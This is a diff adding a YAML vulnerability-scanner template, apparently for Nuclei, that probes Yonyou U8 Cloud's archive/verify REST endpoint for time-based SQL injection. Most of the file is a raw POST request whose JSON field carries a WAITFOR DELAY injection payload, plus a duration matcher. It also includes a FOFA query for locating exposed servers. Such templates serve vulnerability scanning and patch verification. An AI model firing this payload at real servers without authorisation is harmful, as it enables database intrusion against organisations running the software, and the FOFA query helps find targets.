@@ -1,0 +1,30 @@
+id: yonyou-u8-cloud-archive-verify-sqli
+info:
+  name: 用友 U8 Cloud archive/verify - sqli 
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8BU8-Cloud-ArchiveVerify%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
+  metadata:
+    verified: true
+    fofa-query: app="用友-U8-Cloud" || title=="U8C"
+  tags: yonyou,u8cloud,sqli,oa,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        {"orgInfo":{"code":"1';WAITFOR DELAY '0:0:6'--"}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
